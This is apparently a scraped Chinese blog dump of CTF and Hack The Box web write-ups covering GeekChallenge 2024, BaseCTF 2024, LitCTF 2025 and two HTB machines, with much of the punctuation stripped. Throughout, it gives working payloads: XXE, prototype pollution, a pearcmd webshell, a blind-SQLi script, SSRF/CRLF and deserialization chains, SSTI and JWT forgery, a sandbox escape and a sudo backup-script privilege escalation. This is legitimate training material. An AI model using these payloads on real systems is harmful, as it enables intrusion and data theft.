eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIlx1NzY3Ylx1NWY1NVx1NjIxMFx1NTI5ZiJdfV0sInVzZXJuYW1lIjoiYWRtaW4ifQ.aHlE-w.nB3vpPtfKPGUFrvwAf7omq5zx_U 进去面板 反编译pyc # Visit https://www.lddgo.net/string/pyc-compile-decompile for more information# Version : Python 3.6import jsonfrom lxml import etreefrom flask import Flask, request, render_template, flash, redirect, url_for, session, Response, send_file, jsonifyapp = Flask(__name__)app.secret_key = a123456app.config[xml_data] = ?xml version=1.0 encoding=UTF-8?GeekChallenge2024EventNameGeek Challenge/EventNameYear2024/YearDescriptionThis is a challenge event for geeks in the year 2024./Description/GeekChallenge2024class User: def __init__(self, username, password): self.username = username self.password = password def check(self, data): if self.username == data[username]: pass return self.password == data[password]admin = User(admin, 123456j1rrynonono)Users = [ admin]def update(src, dst): for k, v in src.items(): if hasattr(dst, __getitem__): if dst.get(k) and isinstance(v, dict): update(v, dst.get(k)) else: dst[k] = v if hasattr(dst, k) and isinstance(v, dict): update(v, getattr(dst, k)) continue setattr(dst, k, v) def register(): if request.method == POST: username = request.form[username] password = request.form[password] for u in Users: if u.username == username: flash(用户名已存在, error) return redirect(url_for(register)) new_user = User(username, password) Users.append(new_user) flash(注册成功！请登录, success) return redirect(url_for(login)) return None(register.html)register = app.route(/register, [ GET, POST], **(methods,))(register)def login(): if request.method == POST: username = request.form[username] password = request.form[password] for u in Users: if u.check( username: username, password: password ): session[username] = username flash(登录成功, success) return redirect(url_for(dashboard)) flash(用户名或密码错误, error) return redirect(url_for(login)) return None(login.html)login = app.route(/login, [ GET, POST], **(methods,))(login)def play(): pass# WARNING: Decompyle incompleteplay = app.route(/play, [ GET, POST], **(methods,))(play)def admin(): if username in session and session[username] == admin: return render_template(admin.html, session[username], **(username,)) None(你没有权限访问, error) return redirect(url_for(login))admin = app.route(/admin, [ GET, POST], **(methods,))(admin)def downloads321(): return send_file(./source/app.pyc, True, **(as_attachment,))downloads321 = app.route(/downloads321)(downloads321)def index(): return render_template(index.html)index = app.route(/)(index)def dashboard(): if username in session: is_admin = session[username] == admin if is_admin: user_tag = Admin User else: user_tag = Normal User return render_template(dashboard.html, session[username], user_tag, is_admin, **(username, tag, is_admin)) None(请先登录, error) return redirect(url_for(login))dashboard = app.route(/dashboard)(dashboard)def xml_parse(): try: xml_bytes = app.config[xml_data].encode(utf-8) parser = etree.XMLParser(True, True, **(load_dtd, resolve_entities)) tree = etree.fromstring(xml_bytes, parser, **(parser,)) result_xml = etree.tostring(tree, True, utf-8, True, **(pretty_print, encoding, xml_declaration)) return Response(result_xml, application/xml, **(mimetype,)) except etree.XMLSyntaxError: e = None try: return str(e) e = None del e return Nonexml_parse = app.route(/xml_parse)(xml_parse)black_list = [ __class__.encode(), __init__.encode(), __globals__.encode()]def check(data): print(data) for i in black_list: print(i) if i in data: print(i) return False return Truedef update_route(): if username in session and session[username] == admin: if request.data: try: if not check(request.data): return (NONONO, Bad Hacker, 403) data = None.loads(request.data.decode()) print(data) if all((lambda .0: pass)(data.values())): update(data, User) return (jsonify( message: 更新成功 ), 200) return None except Exception: e = None try: return (fException: str(e), 500) e = None del e return (No data provided, 400) return redirect(url_for(login)) return Noneupdate_route = app.route(/update, [ POST], **(methods,))(update_route)if __name__ == __main__: app.run(0.0.0.0, 80, False, **(host, port, debug)) 有一个xxe注入和一个python的原型链污染 \\u005F\\u005Finit__: \\u005F\\u005Fglobals__: app: config: xml_data: ?xml version=\\1.0\\ encoding=\\UTF-8\\? !DOCTYPE foo [ !ENTITY xxe SYSTEM \\F\\u0069\\u006C\\u0065:///flag\\ ] fooxxe;/foo 然后去访问 rce_me?phpheader(Content-type:text/html;charset=utf-8);highlight_file(__FILE__);error_reporting(0);# Can you RCE me?if (!is_array($_POST[start])) if (!preg_match(/start.*now/is, $_POST[start])) if (strpos($_POST[start], start now) === false) die(Well, you havent started.br); echo Welcome to GeekChallenge2024!br;if ( sha1((string) $_POST[__2024.geekchallenge.ctf]) == md5(Geekchallenge2024_bmKtL) (string) $_POST[__2024.geekchallenge.ctf] != Geekchallenge2024_bmKtL is_numeric(intval($_POST[__2024.geekchallenge.ctf]))) echo You took the first step!br; foreach ($_GET as $key = $value) $$key = $value; if (intval($year) 2024 intval($year + 1) 2025) echo Well, I know the year is 2024br; if (preg_match(/.+?rce/ism, $purpose)) die(nonono); if (stripos($purpose, rce) === false) die(nonononono); echo Get the flag now!br; eval($GLOBALS[code]); else echo It is not enough to stop you!br; else echo It is so easy, do you know sha1 and md5?br;? 100%的⚪ ez_js输入账号密码抓包 得到 然后提示 帐号密码改为 得到源码 const merge = require(./utils/common.js); function handleLogin(req, res) var geeker = new function() this.geekerData = new function() this.username = req.body.username; this.password = req.body.password; ; ; merge(geeker, req.body); if(geeker.geekerData.username == Starven geeker.geekerData.password == 123456) if(geeker.hasFlag) const filePath = path.join(__dirname, static, direct.html); res.sendFile(filePath, (err) = if (err) console.error(err); res.status(err.status).end(); ); else const filePath = path.join(__dirname, static, error.html); res.sendFile(filePath, (err) = if (err) console.error(err); res.status(err.status).end(); ); else const filePath = path.join(__dirname, static, error2.html); res.sendFile(filePath, (err) = if (err) console.error(err); res.status(err.status).end(); ); h1function merge(object1, object2) for (let key in object2) if (key in object2 key in object1) merge(object1[key], object2[key]); else object1[key] = object2[key]; module.exports = merge ; ez_include进去就是require文件包含 使用poc ?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/starven_secret.php 得到base64 ?php$secret = congratulation! you can goto /levelllll2.php to capture the flag!;? 到下一个路径 开启了register_argc_argv On 明显的pearcmd.php包含 levelllll2.php?+config-create+/syc=/usr/local/lib/php/pearcmd.php/?=eval($_POST[1]);?+/tmp/cmd.php ?syc=/tmp/cmd.php1=system(env); 这题我没打通 但是做法是这样的 funnySQL由于是复现直接可以看到waf捏 if(preg_match(/and|or| | |--|sleep|=|ascii/i,$str)) die(不准用！) 并且这个sql没有回显，所以就考虑使用盲注，sleep被禁了使用benchmark 使用like代替 不能使用ASCII直接使用字母 ||if(substr((SELECT/**/database()),i,1)/**/like/**/j,BENCHMARK(1000000,MD5(0ran9e)),0)%23 information被禁止 用mysql.innodb_table_stats代替 import timeimport requestsfrom concurrent.futures import ThreadPoolExecutor, as_completedimport stringurl = http://80-bf7876f6-f16a-43dc-8cdc-67fd16d95a36.challenge.ctfplus.cn/index.php?username=DICT = 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#()*+,-./:;=?@[\\\\]^`|~dicts = string.ascii_lowercase+string.digits+-+def check_char(i, j, payload): start = time.time() res = requests.get(url + payload) end = time.time() return end - start, jdef main(): flag = for i in range(1, 100): with ThreadPoolExecutor(max_workers=20) as executor: future_to_char = for j in dicts: #payload = f1||if(substr((SELECT/**/database()),i,1)/**/like/**/j,BENCHMARK(1000000,MD5(0ran9e)),0)%23 #payload = f||if((substr((SELECT/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/like/**/syclover),i,1)/**/like/**/j),benchmark(10000000,sha1(1)),0)%23 payload = f||if((substr((SELECT/**/group_concat(flag)/**/from/**/Rea11ys3ccccccr3333t),i,1)/**/like/**/j),benchmark(10000000,sha1(1)),0)%23 future = executor.submit(check_char, i, j, payload) future_to_char[future] = j for future in as_completed(future_to_char): elapsed_time, char = future.result() if elapsed_time 2.5: flag += char print(fflag so far: flag) break print(flag , flag)if __name__ == __main__: main() 数据名为syclover 表名为Rea11ys3ccccccr3333t 列名flag syc换成大写SYC就对了 ez_SSRF首先扫出www.zip 有源码三个php文件 审计过后 外网使用的是h4d333333.php 内网使用的是calculator.php h4d333333.php 有一个与原生类SoapClient可以进行SSRF 本来题目就是SSRF 参考文章利用SoapClient类进行SSRF+CRLF攻击 | Xiaojian Yuan’s Homepage ?php$target = http://127.0.0.1/flag.php;$post_string = expression=system(cat /flag 1.txt);;$headers = array( X-Forwarded-For: 127.0.0.1, AUTHORIZATION: YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0,);$b = new SoapClient(null,array(location = $target,user_agent=Sauy^^Content-Type: application/x-www-form-urlencoded^^.join(^^,$headers).^^Content-Length: .(string)strlen($post_string).^^^^.$post_string,uri = aaab));$aaa = serialize($b);$aaa = str_replace(^^,%0d%0a,$aaa);$aaa = str_replace(,%26,$aaa);echo $aaa;? 只需要useragent那一段 Sauy%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0aX-Forwarded-For: 127.0.0.1%0d%0aAUTHORIZATION: YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0%0d%0aContent-Length: 36%0d%0a%0d%0aexpression=system(cat /flag1.txt); cookie也要加上 访问1.txt即可拿到flag jwt_pickleez_include-","tags":["CTF-wp"]},{"title":"Basectf2024-web","path":"/2025/07/09/BaseCTF2024-WEB/","content":"数学大师经典request脚本题 正则ai就行 注意点就是把×替换为* ÷替换为 并且开启session cookie 因为判断连续正确依靠cookie import reimport requestsurl = http://gz.imxbt.cn:20429/sess=requests.session()sess.cookies.set(PHPSESSID, d5nu0bl94l91naj2i7heme44vu)response = sess.get(url)count = 0for i in range(50): match = re.search(r(\\d+)\\s*([+\\-\\*/×÷])\\s*(\\d+), response.text) a, op, b = match.groups() if op == ×: op = * if op == ÷: op = // expr = faopb answer = eval(expr) print(f第i + 1题: expr = answer) response = sess.post(url, data=answer: str(answer)) count += 1 if count == 50: print(response.text) flag:BaseCTFf93114a9-c1ea-41a7-b05a-d2bb8e32a9ed 玩原神玩的php审计题 ?phphighlight_file(__FILE__);error_reporting(0);include flag.php;if (sizeof($_POST[len]) == sizeof($array)) ys_open($_GET[tip]); else die(错了！就你还想玩原神？❌❌❌);function ys_open($tip) if ($tip != 我要玩原神) die(我不管，我要玩原神！😭😭😭); dumpFlag();function dumpFlag() if (!isset($_POST[m]) || sizeof($_POST[m]) != 2) die(可恶的QQ人！😡😡😡); $a = $_POST[m][0]; $b = $_POST[m][1]; if(empty($a) || empty($b) || $a != 100% || $b != love100% . md5($a)) die(某站崩了？肯定是某忽悠干的！😡😡😡); include flag.php; $flag[] = array(); for ($ii = 0;$ii sizeof($array);$ii++) $flag[$ii] = md5(ord($array[$ii]) ^ $ii); echo json_encode($flag); 第一步就是比较len数组的长度是否和flag的长度相同，爆破即可传参 GET:?tip=我要玩原神 POST:len[0]=1len[1]=1len[2]=1len[3]=1len[4]=1len[5]=1len[6]=1len[7]=1len[8]=1len[9]=1len[10]=1len[11]=1len[12]=1len[13]=1len[14]=1len[15]=1len[16]=1len[17]=1len[18]=1len[19]=1len[20]=1len[21]=1len[22]=1len[23]=1len[24]=1len[25]=1len[26]=1len[27]=1len[28]=1len[29]=1len[30]=1len[31]=1len[32]=1len[33]=1len[34]=1len[35]=1len[36]=1len[37]=1len[38]=1len[39]=1len[40]=1len[41]=1len[42]=1len[43]=1len[44]=1 第二步很简单字面意思 GET不变 POST:len[0]=1len[1]=1len[2]=1len[3]=1len[4]=1len[5]=1len[6]=1len[7]=1len[8]=1len[9]=1len[10]=1len[11]=1len[12]=1len[13]=1len[14]=1len[15]=1len[16]=1len[17]=1len[18]=1len[19]=1len[20]=1len[21]=1len[22]=1len[23]=1len[24]=1len[25]=1len[26]=1len[27]=1len[28]=1len[29]=1len[30]=1len[31]=1len[32]=1len[33]=1len[34]=1len[35]=1len[36]=1len[37]=1len[38]=1len[39]=1len[40]=1len[41]=1len[42]=1len[43]=1len[44]=1m[0]=100%25m[1]=love100%2530bd7ce7de206924302499f197c7a966 %记得url编码 得到列表 最后一步ai给你写个还原脚本就好 import hashlibmd5_list = [ 3295c76acbf4caaed33c36b1b5fc2cb1,26657d5ff9020d2abefe558796b99584,73278a4a86960eeb576a8fd4c9ec6997, ec8956637a99787bd197eacd77acce5e,e2c420d928d4bf8ce0ff2ec19b371514,43ec517d68b6edd3015b3edc9a11367b, ea5d2f1c4608232e07d3aa3d998e5135,c8ffe9a587b126f152ed3d89a146b445,2723d092b63885e0d7c260cc007e8b9d, 2723d092b63885e0d7c260cc007e8b9d,c9e1074f5b3f9fc8ea15d152add07294,c9e1074f5b3f9fc8ea15d152add07294, f0935e4cd5920aa6c7c996a5ee53a70f,65b9eea6e1cc6bb9f0cd2a47751a186f,03afdbd66e7929b125f8597834fa83a4, 44f683a84163b3523afe57c2e008bc8c,7f39f8317fbdb1988ef4c628eba02591,d67d8ab4f4c10bf22aa353e27879133c, 6364d3f0f495b6ab9dcf8d3b5c6e0b01,a5771bce93e200c36f7cd9dfd0e5deaa,6c8349cc7260ae62e3b1396831a8398f, 9f61408e3afb633e50cdf1b20de6f466,e369853df766fa44e1ed0ff613f563bd,d67d8ab4f4c10bf22aa353e27879133c, a0a080f42e6f13b3a2df133f073095dd,c8ffe9a587b126f152ed3d89a146b445,b53b3a3d6ab90ce0268229151c9bde11, e369853df766fa44e1ed0ff613f563bd,6c8349cc7260ae62e3b1396831a8398f,4c56ff4ce4aaf9573aa5dff913df997a, d645920e395fedad7bbbed0eca3fe2e0,c0c7c76d30bd3dcaefc96f40275bdc0a,1ff1de774005f8da13f42943881c655f, 8e296a067a37563370ded05f5a3bf3ec,7cbbc409ec990f19c78c75bd1e06f215,6f4922f45568161a8cdf4ad2299f6d23, 1f0e3dad99908345f7439f8ffabdffc4,a3f390d88e4c41f2747bfa2f1b5f87db,3295c76acbf4caaed33c36b1b5fc2cb1, 735b90b4568125ed6c3f678819b6e058,c74d97b01eae257e44aa9d5bade97baf,6ea9ab1baa0efb9e19094440c317e21b, 4e732ced3463d06de0ca9a15b6153677,33e75ff09dd601bbe69f351039152189,43ec517d68b6edd3015b3edc9a11367b]def md5_str(s: str) - str: return hashlib.md5(s.encode()).hexdigest()flag_chars = []for i, target_md5 in enumerate(md5_list): found = False for c in range(32, 127): # 常见可打印字符ASCII范围 val = c ^ i val_str = str(val) if md5_str(val_str) == target_md5: flag_chars.append(chr(c)) found = True break if not found: flag_chars.append(?)flag = .join(flag_chars)print(还原的flag:, flag) flag:BaseCTFedbcfd11-6259-40be-91d6-88d17add8407 1z_php?phphighlight_file(index.php);# 我记得她...好像叫flag.php吧？$emp=$_GET[e_m.p];$try=$_POST[try];if($emp!=114514intval($emp,0)===114514) for ($i=0;$istrlen($emp);$i++) if (ctype_alpha($emp[$i])) die(你不是hacker？那请去外场等候！); echo 只有真正的hacker才能拿到flag！.br; if (preg_match(/.+?HACKER/is,$try)) die(你是hacker还敢自报家门呢？); if (!stripos($try,HACKER) === TRUE) die(你连自己是hacker都不承认，还想要flag呢？); $a=$_GET[a]; $b=$_GET[b]; $c=$_GET[c]; if(stripos($b,php)!==0) die(收手吧hacker，你得不到flag的！); echo (new $a($b))-$c();else die(114514到底是啥意思嘞？。？);# 觉得困难的话就直接把shell拿去用吧，不用谢~$shell=$_POST[shell];eval($shell);? 第一个intval特性 ,传参还考了一个php非法传参,e[m.p=114514,即可 第二步 绕过正则并且不满足!stripos($try,HACKER) === TRUE,当我们传入tryHACKER的时候，会输出你连自己是hacker都不承认，还想要flag呢？ 绕不过 使用最大正则回溯 最后 (new $a($b))-$c() 很明显的php使用原生类读文件 import requestsurl = (http://gz.imxbt.cn:20693/ ?e[m.p=114514.1 a=SplFileObject b=php://filter/read=convert.base64-encode/resource=flag.php c=__toString)data = try: f * 1000001 + HACKERres = requests.post(url=url, data=data)print(res.text) flag:BaseCTF07e8680b-b866-4d95-a053-20f723b24c06 A Dark Room签到题 ctrl+u即得 Aura 酱的礼物简单的伪协议和ssrf绕过 POST：pen=data://text/plain,Aurachallenge=http://jasmineaura.github.io@127.0.0.1gift=php://filter/convert.base64-encode/resource=flag.php flag:BaseCTFe996ff9f-4941-4247-a168-e9aa94e6fd8b Back to the future进去都没有 看看有无robots.txt 有 User-agent: *Disallow: /.git 直白的git泄露 使用git-dumper https://github.com/arthaud/git-dumper python3 git_dumper.py http://gz.imxbt.cn:20805/.git/ ./basectf 拉下来发现只有一个README.md,内容是 # My WebsiteThis is my web project.Oops, I place flag here, but i deleted it! 于是我们去查看log 即可得到flag flag:BaseCTF1aa62024-5a12-4f55-80fa-cb9c41e1154b HTTP 是什么呀签到题 POST /?basectf=we1c%2500me HTTP/1.1Host: gz.imxbt.cn:20807Content-Type: application/x-www-form-urlencodedUser-Agent: BaseCookie: c00k13=i cant eat itReferer: BaseX-Forwarded-For: 127.0.0.1Base=fl@g 然后有一个重定向,抓跳转一瞬间的包就行，response里有flag的base64编码 Jinja Mark首先进入界面提示了index和flag路由 flag路由进去猜幸运数字 爆破就行 可以得到部分源码 BLACKLIST_IN_index = [,]def merge(src, dst): for k, v in src.items(): if hasattr(dst, __getitem__): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)@app.route(/magic,methods=[POST, GET])def pollute(): if request.method == POST: if request.is_json: merge(json.loads(request.data), instance) return 这个魔术还行吧 else: return 我要json的魔术 return 记得用POST方法把魔术交上来 ssti禁止了{和}，就这点来说不能进行ssti了，但是我们还有一个magic路径没用，在magic路由下污染jinja的语法标识符 __init__ : __globals__ : app : jinja_env :variable_start_string : ,variable_end_string: 再在index路径下进行正常的ssti注入就可 lipsum.__globals__.__builtins__.__import__(os).popen(cat /flag).read() flag:BaseCTF5e4b7b9a-ce09-49f0-8e43-4efca0964ebd No JWT给了源码 from flask import Flask, request, jsonifyimport jwtimport datetimeimport osimport randomimport stringapp = Flask(__name__)# 随机生成 secret_keyapp.secret_key = .join(random.choices(string.ascii_letters + string.digits, k=16))# 登录接口@app.route(/login, methods=[POST])def login(): data = request.json username = data.get(username) password = data.get(password) # 其他用户都给予 user 权限 token = jwt.encode( sub: username, role: user, # 普通用户角色 exp: datetime.datetime.utcnow() + datetime.timedelta(hours=1) , app.secret_key, algorithm=HS256) return jsonify(token: token), 200# flag 接口@app.route(/flag, methods=[GET])def flag(): token = request.headers.get(Authorization) if token: try: decoded = jwt.decode(token.split( )[1], options=verify_signature: False, verify_exp: False) # 检查用户角色是否为 admin if decoded.get(role) == admin: with open(/flag, r) as f: flag_content = f.read() return jsonify(flag: flag_content), 200 else: return jsonify(message: Access denied: admin only), 403 except FileNotFoundError: return jsonify(message: Flag file not found), 404 except jwt.ExpiredSignatureError: return jsonify(message: Token has expired), 401 except jwt.InvalidTokenError: return jsonify(message: Invalid token), 401 return jsonify(message: Token is missing), 401if __name__ == __main__: app.run(debug=True) 一眼JWT伪造，首先去login拿到原始token 找一个网站https://www.bejson.com/jwt/ 将role改为admin即可 GET /flag HTTP/1.1Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzYXV5Iiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzUyNDgzMDc3fQ.T9JaxnAd3WpQucobpUiDPYl52FqfnNiZ7frMu-rCrSs flag:BaseCTFd1d644ea-e932-4db8-a1df-e7be8b450e0d RCEisamazingwithspace简单的RCE绕过空格 ${IFS} POST:cmd=cat$IFS/flag flag:BaseCTF50ef1244-a571-48dc-84f4-0a3cfe832b3c Really EZ POP很简单的pop链子 ?phpclass Sink private $cmd = system(cat /flag);;class Shark private $word; public function __construct() $this - word = new Sink(); class Sea public $animal; public function __construct() $this-animal = new Shark(); class Nature public $sea; public function __construct() $this - sea = new Sea(); $a = new Nature();echo urlencode(serialize($a));? 唯一注意就是private属性外部不可调用 only one sql?phphighlight_file(__FILE__);$sql = $_GET[sql];if (preg_match(/select|;|@| /i, $sql)) die(你知道的，不可能有sql注入);if (preg_match(/|\\$|`|\\\\\\\\/i, $sql)) die(你知道的，不可能有RCE);//flag in ctf.flag$query = mysql -u root -p123456 -e \\use ctf;select 没有select，让你执行一句又如何; . $sql . \\;system($query); 可以用show 来查询 database table column 其他的 RCE or Sql Inject","tags":["CTF-wp"]},{"title":"LitCTF 2025 复现","path":"/2025/07/07/LitCTF2025wp/","content":"[LitCTF 2025]easy_fileF12源代码 script const particlesContainer = document.getElementById(particles); for (let i = 0; i 30; i++) const particle = document.createElement(div); particle.className = particle; particle.style.width = `$Math.random() * 20 + 5px`; particle.style.height = particle.style.width; particle.style.left = `$Math.random() * 100%`; particle.style.top = `$Math.random() * 100%`; particle.style.animationDelay = `$Math.random() * 5s`; particlesContainer.appendChild(particle); document.getElementById(loginForm).addEventListener(submit, function(e) e.preventDefault(); const username = this.querySelector(input[name=username]).value; const password = this.querySelector(input[name=password]).value; const encoder = new TextEncoder(); const encode = str = btoa(String.fromCharCode(...encoder.encode(str))); this.querySelector(input[name=username]).value = encode(username); this.querySelector(input[name=password]).value = encode(password); this.submit(); ); //file查看头像/script 有查看jpg的点 进去就是登录框 首先尝试弱口令 用户名照常admin 密码随便猜的弱密码 虽然错误但是发现回到登陆页面它给你填好了帐号 YWRtaW4是admin的base64 所以我们猜测帐号密码应该都是base64过后的弱口令 然后你抓包也能知道他是base64编码 burp字典爆破即可 爆破出来为password 登陆进去是文件上传的点 只能上传txt和jpg 如果只能上传jpg上传个图片马看看 检测php使用短标签 图片马条件是必须有文件包含 刚好这里前面源代码有一个file查看图片 [LitCTF 2025]君の名は进去就是php代码 反序列化 ?phphighlight_file(__FILE__);error_reporting(0);create_function(, die(`/readflag`););class Taki private $musubi; private $magic; public function __unserialize(array $data) $this-musubi = $data[musubi]; $this-magic = $data[magic]; return ($this-musubi)(); public function __call($func,$args) (new $args[0]($args[1]))-$this-magic(); class Mitsuha private $memory; private $thread; public function __invoke() return $this-memory.$this-thread; class KatawareDoki private $soul; private $kuchikamizake; private $name; public function __toString() ($this-soul)-flag($this-kuchikamizake,$this-name); return call error!no flag!; $Litctf2025 = $_POST[Litctf2025];if(!preg_match(/^[Oa]:[\\d]+/i, $Litctf2025)) unserialize($Litctf2025);else echo 把O改成C不就行了吗,笨蛋!～(∠・ω )⌒☆; 这是道很好的题 对不擅长php序列化的师傅有点难理解 但请耐心看完 首先先找最后获取flag的点是 create_function(“”, ‘die(/readflag);’); 创造了一个匿名的函数来执行读取flag的操作 所以我们要读取flag就得通过反序列化调用这个匿名函数。 所以现在有几个点需要解决: 1.匿名函数的名字 2.怎么调用匿名函数 3.绕过最后一步 1. ?php $a = create_function(,die(` /readflag`););var_dump($a);#\\000lambda_1 输出就是其名字 但是网页每刷新一次 函数名后的数字就会加1 2. 链子顺序很简单,是: Taki::__unserialize-Mitsuha::__invoke-KatawareDoki::__toString-Taki::__call 仔细看 public function __call($func,$args) (new $args[0]($args[1]))-$this-magic(); new $args[0]($args[1])用调用时传入的第一个参数 $args[0] 作为类名，动态创建这个类的实例。用第二个参数 $args[1] 作为该类构造函数的参数。 -$this-magic()调用新实例中，名字为 $this-magic 的方法，且无参数。 所以这里考了原生类的知识点 使用ReflectionFunction的invoke方法调用无参函数 理解: $rf = new ReflectionFunction($closure);$rf-invoke() 意为调用$closure这个函数。那么回到此题，即是调用lambda_1这个函数，读到flag。 $fun会被赋值为flag(),$args则是flag()里的东西 3. 绕过使用类对链子进行包装，这样开头的O就会替换为C，以此绕过。以下这些原生类是C开头 ArrayObject::unserializeArrayIterator::unserializeRecursiveArrayIterator::unserializeSplDoublyLinkedList::unserializeSplQueue::unserializeSplStack::unserializeSplObjectStorage::unserialize POP链: ?phpclass Taki public $musubi; public $magic = invoke;class Mitsuha public $memory; public $thread;class KatawareDoki public $soul; public $kuchikamizake = ReflectionFunction; public $name = \\000lambda_1;$a = new Taki();$b = new Mitsuha();$c = new KatawareDoki();$a - musubi = $b;$b - thread = $c;$c - soul = $a;$d = array(sauy=$a); //这里随便取一个键名就好，意义就是搞成数组$e = new ArrayObject($d); //使用原生类进行封装来进行绕过echo urlencode(serialize($e));?#Litctf2025=C%3A11%3A%22ArrayObject%22%3A244%3A%7Bx%3Ai%3A0%3Ba%3A1%3A%7Bs%3A4%3A%22sauy%22%3BO%3A4%3A%22Taki%22%3A2%3A%7Bs%3A6%3A%22musubi%22%3BO%3A7%3A%22Mitsuha%22%3A2%3A%7Bs%3A6%3A%22memory%22%3BN%3Bs%3A6%3A%22thread%22%3BO%3A12%3A%22KatawareDoki%22%3A3%3A%7Bs%3A4%3A%22soul%22%3Br%3A4%3Bs%3A13%3A%22kuchikamizake%22%3Bs%3A18%3A%22ReflectionFunction%22%3Bs%3A4%3A%22name%22%3Bs%3A9%3A%22%00lambda_1%22%3B%7D%7Ds%3A5%3A%22magic%22%3Bs%3A6%3A%22invoke%22%3B%7D%7D%3Bm%3Aa%3A0%3A%7B%7D%7D 请注意本题php版本是php7.4 但是运行链子请在PHP 5.3版本下运行（推荐使用phpstudy 切换php版本方便) 原因是：PHP版本差异导致的ArrayObject序列化格式变化。在PHP 5.6+及更高版本中，ArrayObject的序列化结构包含三部分（标志位、存储数组、迭代器信息），而旧版PHP（如5.3）则使用不同的自定义格式（以C:开头）–来自DEEPSEEK https://chenxi9981.github.io/php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96/ (php序列化知识总结)","tags":["CTF-wp"]},{"title":"HTB-wp","path":"/2025/07/06/HTB-Practice/","content":"HTB-codeusernmap扫描 nmap 10.10.11.62 -sV -A 发现开放了5000端口 访问发现是个在线执行python代码的网页 可以进行命令执行 print(.__class__.__base__.__subclasses__()[317](ls /,shell=True,stdout=-1).communicate()[0].strip()) 然后直接在上层目录读到user.txt print(.__class__.__base__.__subclasses__()[317](cat ../user.txt,shell=True,stdout=-1).communicate()[0].strip()) root命令执行 print(.__class__.__base__.__subclasses__()[317](ls *,shell=True,stdout=-1).communicate()[0].strip())#bapp.pyinstance: database.db __pycache__: app.cpython-38.pyc static: css templates: about.html codes.html index.html login.html register.html 发现有instance下有database.db 读一下试试看 于是可以拿到 martin的hash加密后的密码 3de6f30c4a09c27fc71932bfc68474be 就是 nafeelswordsmaster 然后使用ssh登录 ssh martin@10.10.11.62 提示输入密码 输入就好了 输入sudo -l 回显 martin@code:~$ sudo -lMatching Defaults entries for martin on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser martin may run the following commands on localhost: (ALL : ALL) NOPASSWD: /usr/bin/backy.sh backy.sh文件内容： 内容大概为三个功能：1.输入检查，必须传入一个 JSON 文件路径（如 task.json），否则报错。检查文件是否存在。2.路径过滤使用,jq 移除 directories_to_archive 中所有 ..（防止目录遍历攻击）。允许的路径范围限定在 var 和 home。3.路径权限检查,is_allowed_path() 函数检查路径是否以 var 或 home 开头（防止访问敏感路径如 root）。 #!/bin/bashif [[ $# -ne 1 ]]; then /usr/bin/echo Usage: $0 task.json exit 1fijson_file=$1if [[ ! -f $json_file ]]; then /usr/bin/echo Error: File $json_file not found. exit 1fiallowed_paths=(/var/ /home/)updated_json=$(/usr/bin/jq .directories_to_archive |= map(gsub(\\\\.\\\\./; )) $json_file)/usr/bin/echo $updated_json $json_filedirectories_to_archive=$(/usr/bin/echo $updated_json | /usr/bin/jq -r .directories_to_archive[])is_allowed_path() local path=$1 for allowed_path in $allowed_paths[@]; do if [[ $path == $allowed_path* ]]; then return 0 fi done return 1for dir in $directories_to_archive; do if ! is_allowed_path $dir; then /usr/bin/echo Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed. exit 1 fidone/usr/bin/backy $json_file task.json 其主要功能是过滤路径并检查允许的目录，先执行一下backy.sh，发现会生成一个压缩包 destination: /home/martin/backups/, multiprocessing: true, verbose_log: false, directories_to_archive: [ /home/app-production/app ], exclude: [ .* ] 做法：将备份目录修改为home….root 并且要删除exclude: [“.*”] 为什么要删除？exclude: [.*]导致/root文件夹被完全排除 destination: /home/martin/backups/, multiprocessing: true, verbose_log: false, directories_to_archive: [ /home/....//root ] sudo /usr/bin/backy.sh task.json 执行ls 发现生成了压缩包 使用tar -xjf code_home_.._root_2025_April.tar.bz2 再ls 发现生成了root目录 进root目录读root.txt即可 HTB-Environment惯例nmap先扫描10.10.11.67 nmap 10.10.11.67 -sV -A 没什么特别的 常见的22和80端口 直接访问 记得配host echo 10.10.11.67 environment.htb | sudo tee -a /etc/hosts 访问后 进入网站界面 没发现什么特别的 也没有可以点的东西 上dirsearch扫描看看 扫出来登录路由 进去尝试登录 发现没什么用 抓包下登录界面 改下参数就出了报错界面 (这一步我是看wp才知道的 告诉我们要多试试) user $keep_loggedin = False; elseif ($remember == True) $keep_loggedin = True;if($keep_loggedin !== False) // TODO: Keep user logged in if he selects Remember Me?if(App::environment() == preprod) //QOL: login directly as me in dev/local/preprod envs $request-session()-regenerate(); $request-session()-put(user_id, 1); return redirect(/management/dashboard);$user = User::where(email, $email)-first(); 然后这里就有可以利用的点了 if(App::environment() == preprod) $request-session()-regenerate(); $request-session()-put(user_id, 1); return redirect(/management/dashboard); 这一段代码意思是 :当运行环境为 preprod 时，直接把 session 中的 user_id 设置为 1，并重定向到后台(常常用于开发者想偷懒直接让自己登陆的) 所以如果我们想登录满足这个就好 找到相关的CVE “https://github.com/Nyamort/CVE-2024-52301“ 按照poc去打于是成功进入后台了！ 在profile里找到一个上传文件的点 进行绕过 加GIF89a 以及后缀加一个. 上传文件成功！然后连接antsword 然后就可以拿到第一个flag了 root然后其实最好的做法是反弹shell 接下来我们打root也方便 